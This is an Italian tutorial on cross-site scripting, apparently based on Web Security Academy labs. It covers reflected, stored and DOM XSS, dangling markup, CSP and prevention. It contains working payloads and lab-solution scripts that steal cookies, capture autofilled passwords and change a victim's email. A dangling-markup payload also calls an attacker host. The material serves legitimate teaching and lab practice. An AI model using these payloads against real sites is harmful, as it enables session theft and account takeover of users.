Cross-site scripting (noto anche come XSS) è una vulnerabilità della sicurezza web che consente a un aggressore di compromettere le interazioni che gli utenti hanno con un'applicazione vulnerabile. Consente a un aggressore di aggirare la **same origin policy**, che è progettata per separare diversi siti web l'uno dall'altro. Le vulnerabilità di cross-site scripting normalmente consentono a un aggressore di mascherarsi da utente vittima, di eseguire qualsiasi azione che l'utente è in grado di eseguire e di accedere a tutti i dati dell'utente. Se l'utente vittima avesse accesso privilegiato all'interno dell'applicazione, l'aggressore potrebbe essere in grado di ottenere il pieno controllo su tutte le funzionalità e i dati dell'applicazione.

Il cross-site scripting funziona manipolando un sito web vulnerabile in modo che restituisca JavaScript dannoso agli utenti. Quando il codice dannoso viene eseguito all'interno del browser di una vittima, l'aggressore può compromettere completamente la sua interazione con l'applicazione.
## XSS proof of concept
È possibile confermare la maggior parte dei tipi di vulnerabilità XSS inietta un payload che fa sì che il browser esegua un codice JavaScript arbitrario. È da tempo prassi comune utilizzare la funzione `alert()` per questo scopo perché è breve, innocua e piuttosto difficile da notare quando viene chiamata correttamente. Infatti, la maggior parte dei nostri laboratori XSS si risolve invocando `alert()` nel browser di una vittima simulata.

Purtroppo, c'è un piccolo intoppo se si utilizza Chrome. Dalla versione 92 in poi (20 luglio 2021), gli iframe cross-origin non possono chiamare `alert()`. Poiché vengono utilizzati per costruire alcuni degli attacchi XSS più avanzati, a volte sarà necessario utilizzare un payload PoC alternativo. In questo scenario, consigliamo la funzione `print()`.
## Quali sono i tipi di attacchi XSS?
Esistono tre tipi principali di attacchi XSS. Questi sono:
- **Reflected XSS** in cui lo script dannoso proviene dalla richiesta HTTP corrente;
- **Stored XSS** in cui lo script dannoso proviene dal database del sito web;
- **DOM-based XSS** in cui la vulnerabilità esiste nel codice lato client anziché nel codice lato server.
## Reflected XSS
Il Reflected XSS si verifica quando un'applicazione riceve dati in una richiesta HTTP e include tali dati nella risposta immediata in modo non sicuro.

Supponiamo che un sito web abbia una funzione di ricerca che riceve il termine di ricerca fornito dall'utente in un parametro URL:
`https://insecure-website.com/search?term=gift`

L'applicazione riecheggia il termine di ricerca fornito nella risposta a questo URL:
`<p>You searched for: gift</p>`

Supponendo che l'applicazione non esegua altre elaborazioni dei dati, un aggressore può progettare un attacco come questo:
`https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>`

Questo URL produce la seguente risposta:
`<p>You searched for: <script>/* Bad stuff here... */</script></p>`

Se un altro utente dell'applicazione richiede l'URL dell'aggressore, lo script fornito dall'aggressore verrà eseguito nel browser dell'utente vittima, nel contesto della sua sessione con l'applicazione.
### Impatto degli attacchi Reflected XSS
Se un aggressore può controllare uno script eseguito nel browser della vittima, allora può in genere compromettere completamente quell'utente. Tra le altre cose, l'aggressore può:
- eseguire qualsiasi azione all'interno dell'applicazione che l'utente può eseguire.
- visualizzare qualsiasi informazione che l'utente è in grado di visualizzare.
- modificare qualsiasi informazione che l'utente è in grado di modificare.
- avviare interazioni con altri utenti dell'applicazione, inclusi attacchi dannosi, che sembreranno provenire dall'utente vittima iniziale.

Ci sono vari mezzi con cui un aggressore può indurre un utente vittima a fare una richiesta che controlla, per inviare un attacco Reflected XSS. Questi includono l'inserimento di link su un sito web controllato dall'aggressore, o su un altro sito web che consente la generazione di contenuti, o inviando un link in un'e-mail, tweet o altro messaggio. L'attacco potrebbe essere mirato direttamente contro un utente noto, o potrebbe essere un attacco indiscriminato contro qualsiasi utente dell'applicazione.

La necessità di un meccanismo di distribuzione esterno per l'attacco implica che l'impatto del Reflected XSS sia generalmente meno grave dello Stored XSS, in cui un attacco autonomo può essere distribuito all'interno dell'applicazione vulnerabile stessa.
### Come trovare e testare le vulnerabilità Reflected XSS
La stragrande maggioranza delle vulnerabilità di Reflected XSS può essere trovata in modo rapido e affidabile.
Il test manuale delle vulnerabilità XSS riflesse comporta i seguenti passaggi:
- **testare ogni punto di ingresso:** testare separatamente ogni punto di ingresso per i dati all'interno delle richieste HTTP dell'applicazione. Ciò include parametri o altri dati all'interno della stringa di query URL e del corpo del messaggio e il percorso del file URL. Include anche le intestazioni HTTP, sebbene il comportamento simile a XSS che può essere attivato solo tramite determinate intestazioni HTTP potrebbe non essere sfruttabile nella pratica;
- **inviare valori alfanumerici casuali:** per ogni punto di ingresso, inviare un valore casuale univoco e determinare se il valore è riflesso nella risposta. Il valore dovrebbe essere progettato per sopravvivere alla maggior parte delle convalide di input; quindi, deve essere abbastanza breve e contenere solo caratteri alfanumerici. Ma deve essere sufficientemente lungo da rendere altamente improbabili le corrispondenze accidentali all'interno della risposta. Un valore alfanumerico casuale di circa 8 caratteri è normalmente l'ideale;
- **determina il contesto di riflessione:** per ogni posizione all'interno della risposta in cui viene riflesso il valore casuale, determina il suo contesto. Questo potrebbe essere nel testo tra tag HTML, all'interno di un attributo tag che potrebbe essere tra virgolette, all'interno di una stringa JavaScript, ecc;
- **testare payload alternativi:** se il payload XSS candidato è stato modificato dall'applicazione o bloccato del tutto, dovrai testare payload e tecniche alternativi che potrebbero fornire un attacco XSS funzionante in base al contesto della riflessione e al tipo di convalida dell'input che viene eseguita.
## Stored XSS
Lo Stored XSS si verifica quando un'applicazione riceve dati da una fonte non attendibile e include tali dati nelle sue successive risposte HTTP in modo non sicuro.

Supponiamo che un sito web consenta agli utenti di inviare commenti sui post del blog, che vengono visualizzati ad altri utenti. Gli utenti inviano commenti utilizzando una richiesta HTTP come la seguente:
```http
POST /post/comment HTTP/1.1
Host: vulnerabili-website.com
Content-Length: 100

postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net
```

Dopo che questo commento è stato inviato, qualsiasi utente che visita il post del blog riceverà quanto segue nella risposta dell'applicazione:
`<p>This post was extremely helpful.</p>`

Supponendo che l'applicazione non esegua altre elaborazioni dei dati, un aggressore può inviare un commento dannoso come questo:
`<script>/* Bad stuff here... */</script>`

Nella richiesta dell'attaccante, questo commento sarebbe codificato in URL come:
`comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E`

Ogni utente che visita il post del blog riceverà ora quanto segue nella risposta dell'applicazione:
`<p><script>/* Bad stuff here... */</script></p>`

Lo script fornito dall'aggressore verrà quindi eseguito nel browser dell'utente vittima, nel contesto della sua sessione con l'applicazione.
### Impatto degli attacchi Stored XSS
Se un aggressore riesce a controllare uno script eseguito nel browser della vittima, in genere può compromettere completamente quell'utente. L'aggressore può eseguire una qualsiasi delle azioni applicabili all'impatto delle vulnerabilità Reflected XSS.

In termini di sfruttabilità, la differenza fondamentale tra Reflected XSS e Stored XSS è che una vulnerabilità Stored XSS consente attacchi che sono autosufficienti all'interno dell'applicazione stessa. L'aggressore non ha bisogno di trovare un modo esterno per indurre altri utenti a effettuare una richiesta specifica contenente il proprio exploit. Piuttosto, l'aggressore inserisce il proprio exploit nell'applicazione stessa e attende semplicemente che gli utenti lo incontrino.

La natura autosufficiente degli exploit dello Stored XSS è particolarmente rilevante nelle situazioni in cui una vulnerabilità XSS colpisce solo gli utenti che sono attualmente connessi all'applicazione. Se l'XSS viene riflesso, l'attacco deve essere cronometrato in modo fortuito: un utente che viene indotto a effettuare la richiesta dell'aggressore in un momento in cui non è connesso non verrà compromesso. Al contrario, se l'XSS viene memorizzato, è garantito che l'utente abbia effettuato l'accesso nel momento in cui incontra l'exploit.
### Come trovare e testare le Stored XSS
La ricerca delle Stored XSS può essere effettuata con strumenti come il web vulnerability scanner, anche se eseguirla manualmente è complesso. È necessario individuare tutti i “punti di ingresso” (dove i dati dell’attaccante possono essere inseriti) e i “punti di uscita” (dove tali dati possono comparire nelle risposte dell’applicazione).

I punti di ingresso includono:
- parametri e dati nella stringa di query dell’URL o nel corpo del messaggio;
- percorsi URL;
- intestazioni di richiesta http;
- canali indiretti, come e-mail, tweet di terze parti o contenuti da altri siti, a seconda delle funzionalità dell’applicazione.

I punti di uscita sono tutte le risposte HTTP che potrebbero essere visualizzate a qualsiasi tipo di utente.

La prima fase di test consiste nel trovare i collegamenti tra punti di ingresso e di uscita, osservando dove i dati inviati compaiono nelle risposte. Questo è complicato perché i dati possono apparire in qualsiasi risposta e sono spesso sovrascritti da altre azioni. Una verifica esaustiva richiederebbe test per ogni combinazione, ma per applicazioni complesse è poco praticabile.

In alternativa, un approccio più realistico consiste nel testare i vari punti di ingresso, osservando se i dati inviati riappaiono nelle risposte dell’applicazione. Se un collegamento è identificato, si verifica la presenza di una vulnerabilità XSS inserendo payload mirati per verificare l’esposizione a un attacco.
## DOM-based XSS
Le vulnerabilità DOM-based XSS si verificano solitamente quando JavaScript prende dati da una fonte controllabile dall'aggressore, come l'URL, e li passa a un sink che supporta l'esecuzione di codice dinamico, come `eval()` o `innerHTML`. Ciò consente agli aggressori di eseguire JavaScript dannoso, che in genere consente loro di dirottare gli account di altri utenti.

Per eseguire un attacco DOM-based XSS, è necessario inserire i dati in una fonte in modo che vengano propagati a un sink e provochino l'esecuzione di JavaScript arbitrario.

La fonte più comune per DOM XSS è l'URL, a cui in genere si accede con l'oggetto `window.location`. Un aggressore può creare un collegamento per inviare una vittima a una pagina vulnerabile con un payload nella stringa di query e frammenti di porzioni dell'URL. In determinate circostanze, come quando si prende di mira una pagina 404 o un sito web che esegue PHP, il payload può anche essere inserito nel percorso.
### Come testare lo scripting cross-site basato su DOM
Le vulnerabilità DOM-based XSS possono essere rilevate rapidamente, ma è anche possibile testarle manualmente utilizzando strumenti per sviluppatori in un browser, come Chrome. In questo processo, ogni “source” (fonte) deve essere esaminata singolarmente.
- **test dei “sink” HTML:** per verificare la presenza di DOM XSS nei “sink” HTML, si inserisce una stringa casuale nella fonte (ad esempio, `location.search`) e si utilizza lo strumento di ispezione HTML per individuare dove compare la stringa. Il comando “View source” non è utile per il DOM XSS, poiché non mostra le modifiche apportate da JavaScript; invece, negli strumenti per sviluppatori di Chrome è possibile cercare la stringa direttamente nel DOM. Per ogni posizione in cui la stringa appare, si deve identificare il contesto e affinare l’input per verificare come viene elaborato;
- **test dei “sink” di esecuzione JavaScript:** testare i “sink” di esecuzione JavaScript per il DOM XSS è più complesso, poiché l’input potrebbe non apparire nel DOM. È necessario esaminare il codice JavaScript con il debugger, aggiungere un breakpoint dove viene letto il “source” e monitorare l’uso della variabile fino al “sink”. A questo punto, si può affinare l’input per verificare se è possibile eseguire un attacco XSS.
### Sfruttamento di DOM XSS con diverse sorgenti e sink
In linea di principio, un sito web è vulnerabile allo scripting cross-site basato su DOM se esiste un percorso eseguibile tramite il quale i dati possono propagarsi dalla sorgente al sink. In pratica, diverse sorgenti e sink hanno proprietà e comportamenti diversi che possono influire sulla sfruttabilità e determinare quali tecniche sono necessarie. Inoltre, gli script del sito web potrebbero eseguire la convalida o altre elaborazioni di dati che devono essere ospitate quando si tenta di sfruttare una vulnerabilità. Esistono diversi sink che sono rilevanti per le vulnerabilità basate su DOM.

Il sink `document.write` funziona con elementi script, quindi è possibile utilizzare un payload semplice, come quello seguente:
`document.write('... <script>alert(document.domain)</script> ...');`

Si noti, tuttavia, che in alcune situazioni il contenuto scritto in `document.write` include un contesto circostante di cui è necessario tenere conto nel proprio exploit. Ad esempio, potrebbe essere necessario chiudere alcuni elementi esistenti prima di utilizzare il payload JavaScript.

Il sink `innerHTML` non accetta elementi script su nessun browser moderno, né gli eventi svg `onload` vengono attivati. Ciò significa che dovrai usare elementi alternativi come `img` o `iframe`. I gestori di eventi come `onload` e `onerror` possono essere usati insieme a questi elementi. Ad esempio:
`element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'`

Le applicazioni web moderne sono in genere realizzate utilizzando una serie di librerie e framework di terze parti, che spesso forniscono funzioni e capacità aggiuntive per gli sviluppatori. È importante ricordare che alcune di queste sono anche potenziali fonti e sink per DOM XSS:

**DOM XSS in jQuery:** se si utilizza una libreria JavaScript come jQuery, bisogna fare attenzione ai sink che possono modificare gli elementi DOM sulla pagina. Ad esempio, la funzione `attr()` di jQuery può modificare gli attributi degli elementi DOM. Se i dati vengono letti da una fonte controllata dall'utente come l'URL, quindi passati alla funzione `attr()`, potrebbe essere possibile manipolare il valore inviato per causare XSS. Ad esempio, qui abbiamo un po' di JavaScript che modifica l'attributo `href` di un elemento di ancoraggio utilizzando i dati dall'URL:
```javascript
$(function() {
$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```
Puoi sfruttarlo modificando l'URL in modo che la sorgente `location.search` contenga un URL JavaScript dannoso. Dopo che il JavaScript della pagina applica questo URL dannoso all'href del back link, cliccando sul back link verrà eseguito:
`?returnUrl=javascript:alert(document.domain)`

Un altro potenziale sink da tenere d'occhio è la funzione selettore `$()` di jQuery, che può essere utilizzata per iniettare oggetti dannosi nel DOM. jQuery era molto popolare e una classica vulnerabilità DOM XSS era causata da siti web che utilizzavano questo selettore insieme alla sorgente `location.hash` per le animazioni o lo scorrimento automatico verso un elemento particolare sulla pagina. Questo comportamento veniva spesso implementato utilizzando un gestore di eventi `hashchange` vulnerabile, simile al seguente:
```javascript
$(window).on('hashchange', function() {
var element = $(location.hash);
element[0].scrollIntoView();
});
```
Poiché l'hash è controllabile dall'utente, un aggressore potrebbe usarlo per iniettare un vettore XSS nel sink del selettore `$()`. Versioni più recenti di jQuery hanno corretto questa particolare vulnerabilità impedendoti di iniettare HTML in un selettore quando l'input inizia con un carattere hash (#). Tuttavia, potresti comunque trovare codice vulnerabile in natura.

Per sfruttare effettivamente questa classica vulnerabilità, dovrai trovare un modo per attivare un evento `hashchange` senza interazione dell'utente. Uno dei modi più semplici per farlo è distribuire il tuo exploit tramite un iframe:
`<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">`
In questo esempio, l'attributo src punta alla pagina vulnerabile con un valore hash vuoto. Quando l'iframe viene caricato, un vettore XSS viene aggiunto all'hash, causando l'attivazione dell'evento `hashchange`.

**DOM XSS in AngularJS:** se si utilizza un framework come AngularJS, potrebbe essere possibile eseguire JavaScript senza parentesi angolari o eventi. Quando un sito utilizza l'attributo `ng-app` su un elemento HTML, verrà elaborato da AngularJS. In questo caso, AngularJS eseguirà JavaScript all'interno di doppie parentesi graffe che possono verificarsi direttamente in HTML o all'interno di attributi.
### DOM-based XSS combinato con dati reflected e stored
Alcune vulnerabilità DOM-based sono autocontenute in una singola pagina. Se uno script legge alcuni dati dall'URL e li scrive in un sink pericoloso, la vulnerabilità è interamente lato client.

Tuttavia, le fonti non sono limitate ai dati direttamente esposti dai browser, possono anche provenire dal sito web. Ad esempio, i siti web spesso riflettono i parametri URL nella risposta HTML dal server. Ciò è comunemente associato a XSS normale, ma può anche portare a vulnerabilità DOM XSS reflected.

In una vulnerabilità DOM XSS reflected, il server elabora i dati dalla richiesta e li riecheggia nella risposta. I dati riflessi potrebbero essere inseriti in una stringa letterale JavaScript o in un elemento dati all'interno del DOM, come un campo di un modulo. Uno script sulla pagina elabora quindi i dati riflessi in modo non sicuro, scrivendoli infine in un sink pericoloso.
`eval('var data = "reflected string"');`

I siti web possono anche memorizzare dati sul server e rifletterli altrove. In una vulnerabilità DOM XSS stored, il server riceve dati da una richiesta, li memorizza e quindi include i dati in una risposta successiva. Uno script nella risposta successiva contiene un sink che quindi elabora i dati in modo non sicuro.
`element.innerHTML = comment.author`
## Sfruttamento delle vulnerabilità di cross-site scripting
Il modo tradizionale per dimostrare di aver trovato una vulnerabilità di cross-site scripting è creare un popup usando la funzione `alert()`. Questo non perché XSS abbia qualcosa a che fare con i popup; è semplicemente un modo per dimostrare che puoi eseguire JavaScript arbitrario su un dato dominio. Potresti notare che alcune persone usano `alert(document.domain)`. Questo è un modo per rendere esplicito su quale dominio è in esecuzione JavaScript.

A volte vorrai andare oltre e dimostrare che una vulnerabilità XSS è una minaccia reale fornendo un exploit completo. In questa sezione, esploreremo tre dei modi più popolari e potenti per sfruttare una vulnerabilità XSS.
### Sfruttare il cross-site scripting per rubare i cookie
Il furto di cookie è un modo tradizionale per sfruttare XSS. La maggior parte delle applicazioni web utilizza i cookie per la gestione delle sessioni. Puoi sfruttare le vulnerabilità di cross-site scripting per inviare i cookie della vittima al tuo dominio, quindi iniettare manualmente i cookie nel browser e impersonare la vittima.

In pratica, questo approccio presenta alcune limitazioni significative:
- la vittima potrebbe non aver effettuato l'accesso;
- molte applicazioni nascondono i loro cookie da JavaScript utilizzando il flag `HttpOnly`;
- le sessioni potrebbero essere bloccate su fattori aggiuntivi come l'indirizzo IP dell'utente;
- la sessione potrebbe scadere prima che tu riesca a dirottarla.

Per risolvere il laboratorio, bisogna eseguire il seguente comando:
```javascript
<script>
window.onload = () => {
 const csrf = document.getElementsByTagName('form')[0].getElementsByTagName('input')[0].value;
 fetch('https://0a9900d5042125be80f9ccc7009a0036.web-security-academy.net/post/comment', {
 method: 'POST',
 body: `csrf=${csrf}&postId=4&comment=${document.cookie}&name=foo&email=foo@example.com&website=`,
 });
}
</script>
```

### Sfruttare il cross-site scripting per catturare le password
Al giorno d'oggi, molti utenti hanno gestori di password che compilano automaticamente le loro password. Puoi trarne vantaggio creando un input di password, leggendo la password compilata automaticamente e inviandola al tuo dominio. Questa tecnica evita la maggior parte dei problemi associati al furto di cookie e può persino ottenere l'accesso a tutti gli altri account in cui la vittima ha riutilizzato la stessa password.

Lo svantaggio principale di questa tecnica è che funziona solo su utenti che hanno un gestore di password che esegue il riempimento automatico delle password (naturalmente, se un utente non ha una password salvata, puoi comunque provare a ottenere la sua password tramite un attacco di phishing in loco, ma non è esattamente la stessa cosa).

Per risolvere il laboratorio, bisogna eseguire il seguente comando:
```javascript
<input name="username" id="username">
<input type="password" name="password" id="password">
<script>
// it may work also with window.onload, but I opted for 1s delay to let the password manager fill in the username and password fields
setTimeout(() => {
 const csrf = document.getElementsByTagName('form')[0].getElementsByTagName('input')[0].value;
 const username = document.getElementById('username').value;
 const password = document.getElementById('password').value;
 fetch('https://0aec008b0337db878095a879004b00e7.web-security-academy.net/post/comment', {
 method: 'POST',
 body: `csrf=${csrf}&postId=5&comment=${username}:${password}&name=foo&email=foo@example.com&website=`,
 });
}, 1000);
</script>
```

### Sfruttare il cross-site scripting per eseguire CSRF
Tutto ciò che un utente legittimo può fare su un sito web, probabilmente puoi farlo anche tu con XSS. A seconda del sito che stai prendendo di mira, potresti essere in grado di far sì che una vittima invii un messaggio, accetti una richiesta di amicizia, esegua una backdoor in un repository di codice sorgente o trasferisca dei Bitcoin.

Alcuni siti web consentono agli utenti registrati di modificare il proprio indirizzo e-mail senza reinserire la password. Se hai trovato una vulnerabilità XSS, puoi far sì che attivi questa funzionalità per modificare l'indirizzo e-mail della vittima con uno che controlli tu, quindi attivare una reimpostazione della password per ottenere l'accesso all'account.

Questo tipo di exploit è in genere definito cross-site request forgery (CSRF), il che è leggermente confusionario perché CSRF può verificarsi anche come vulnerabilità autonoma. Quando CSRF si verifica come vulnerabilità autonoma, può essere patchata utilizzando strategie come token anti-CSRF. Tuttavia, queste strategie non forniscono alcuna protezione se è presente anche una vulnerabilità XSS.

Per risolvere il laboratorio, bisogna eseguire il seguente comando:
```javascript
<script>
window.onload = () => {
 const csrf = document.getElementsByTagName('form')[0].getElementsByTagName('input')[0].value;
 fetch('https://0a5800bf03ee84cb81b68e7a002900d8.web-security-academy.net/my-account/change-email', {
 method: 'POST',
 body: `csrf=${csrf}&email=foobar@example.com`,
 });
}
</script>
```
## Dangling markup injection
Il dangling markup injection è una tecnica per catturare dati cross-domain in situazioni in cui un attacco cross-site scripting completo non è possibile.

Supponiamo che un'applicazione incorpori dati controllabili dall'aggressore nelle sue risposte in modo non sicuro:
`<input type="text" name="input" value="CONTROLLABLE DATA HERE`

Supponiamo anche che l'applicazione non filtri o esegua l'escape dei caratteri `>` o `"`. Un aggressore può usare la seguente sintassi per uscire dal valore dell'attributo tra virgolette e dal tag di chiusura e tornare a un contesto HTML:
`">`

In questa situazione, un aggressore tenterebbe naturalmente di eseguire XSS. Ma supponiamo che un normale attacco XSS non sia possibile, a causa di filtri di input, policy di sicurezza dei contenuti o altri ostacoli. Qui, potrebbe essere ancora possibile eseguire un attacco di dangling markup injection utilizzando un payload come il seguente:
`"><img src='//attacker-website.com?`

Questo payload crea un tag `img` e definisce l'inizio di un attributo `src` contenente un URL sul server dell'attaccante. Nota che il payload dell'attaccante non chiude l'attributo `src`, che rimane "sospeso". Quando un browser analizza la risposta, guarderà avanti finché non incontrerà una virgoletta singola per terminare l'attributo. Tutto fino a quel carattere verrà trattato come parte dell'URL e verrà inviato al server dell'attaccante all'interno della stringa di query dell'URL. Tutti i caratteri non alfanumerici, comprese le nuove righe, saranno codificati in URL.

La conseguenza dell'attacco è che l'attaccante può catturare parte della risposta dell'applicazione dopo il punto di iniezione, che potrebbe contenere dati sensibili. A seconda della funzionalità dell'applicazione, ciò potrebbe includere token CSRF, messaggi di posta elettronica o dati finanziari. Qualsiasi attributo che effettua una richiesta esterna può essere utilizzato per il dangling markup.
### Come prevenire gli attacchi di dangling markup
Puoi prevenire gli attacchi di dangling markup usando le stesse difese generali per prevenire il cross-site scripting, codificando i dati in output e convalidando l'input all'arrivo.

Puoi anche mitigare alcuni attacchi di dangling markup usando la Content Security Policy (CSP). Ad esempio, puoi prevenire alcuni (ma non tutti) gli attacchi, usando una policy che impedisce a tag come `img` di caricare risorse esterne.

**Nota:** il browser Chrome ha deciso di affrontare gli attacchi di markup pendenti impedendo a tag come `img` di definire URL contenenti caratteri grezzi come parentesi angolari e nuove righe. Ciò impedirà gli attacchi poiché i dati che altrimenti verrebbero catturati conterranno generalmente quei caratteri grezzi, quindi l'attacco viene bloccato.
## Content Security Policy (CSP)
CSP è un meccanismo di sicurezza del browser che mira a mitigare XSS e altri attacchi. Funziona limitando le risorse (come script e immagini) che una pagina può caricare e limitando se una pagina può essere inquadrata da altre pagine.

Per abilitare CSP, una risposta deve includere un'intestazione di risposta HTTP denominata `Content-Security-Policy` con un valore contenente la policy. La policy stessa è composta da una o più direttive, separate da punto e virgola.

La seguente direttiva consentirà il caricamento degli script solo dalla stessa origine della pagina stessa:
`script-src 'self'`

La seguente direttiva consentirà il caricamento degli script solo da un dominio specifico:
`script-src https://scripts.normal-website.com`

La seguente direttiva consentirà il caricamento di immagini solo dalla stessa origine della pagina stessa:
`img-src 'self'`

La seguente direttiva consentirà il caricamento di immagini solo da un dominio specifico:
`img-src https://images.normal-website.com`

La seguente direttiva consentirà alla pagina di essere inserita in un frame solo da altre pagine della stessa origine:
`frame-ancestors 'self'`

La seguente direttiva impedirà del tutto il framing:
`frame-ancestors 'none'`

Utilizzare la policy di sicurezza dei contenuti per impedire il clickjacking è più flessibile rispetto all'utilizzo dell'intestazione `X-Frame-Options` perché è possibile specificare più domini e utilizzare caratteri jolly. Ad esempio:
`frame-ancestors 'self' https://normal-website.com https://*.robust-website.com`
### Bypassare CSP con policy injection
Potresti imbatterti in un sito web che riflette l'input nella policy effettiva, molto probabilmente in una direttiva `report-uri`. Se il sito riflette un parametro che puoi controllare, puoi iniettare un punto e virgola per aggiungere le tue direttive CSP. Di solito, questa direttiva `report-uri` è l'ultima nell'elenco. Ciò significa che dovrai sovrascrivere le direttive esistenti per sfruttare questa vulnerabilità e bypassare la policy.

Di solito, non è possibile sovrascrivere una direttiva `script-src` esistente. Tuttavia, Chrome ha recentemente introdotto la direttiva `script-src-elem`, che consente di controllare gli elementi dello script, ma non gli eventi. Fondamentalmente, questa nuova direttiva consente di sovrascrivere le direttive `script-src` esistenti.
## Come prevenire gli attacchi XSS
In alcuni casi, prevenire il cross-site scripting è banale, ma può essere molto più difficile a seconda della complessità dell'applicazione e del modo in cui gestisce i dati controllabili dall'utente.
In generale, prevenire efficacemente le vulnerabilità XSS probabilmente implica una combinazione delle seguenti misure:
- **filtra e valida l'input all'arrivo:** nel punto in cui l'input dell'utente viene ricevuto, filtra il più rigorosamente possibile in base a ciò che è previsto o all'input valido;
- **codifica i dati in output:** nel punto in cui i dati controllabili dall'utente vengono emessi nelle risposte HTTP, codifica l'output per evitare che venga interpretato come contenuto attivo. A seconda del contesto di output, potrebbe essere necessario applicare combinazioni di codifica HTML, URL, JavaScript e CSS;
- **utilizza intestazioni di risposta appropriate:** per prevenire XSS nelle risposte HTTP che non sono destinate a contenere HTML o JavaScript, puoi utilizzare le intestazioni `Content-Type` e `X-Content-Type-Options` per assicurarti che i browser interpretino le risposte nel modo desiderato;
- **politica di sicurezza dei contenuti:** come ultima linea di difesa, è possibile utilizzare Content Security Policy (CSP) per ridurre la gravità delle vulnerabilità XSS ancora presenti.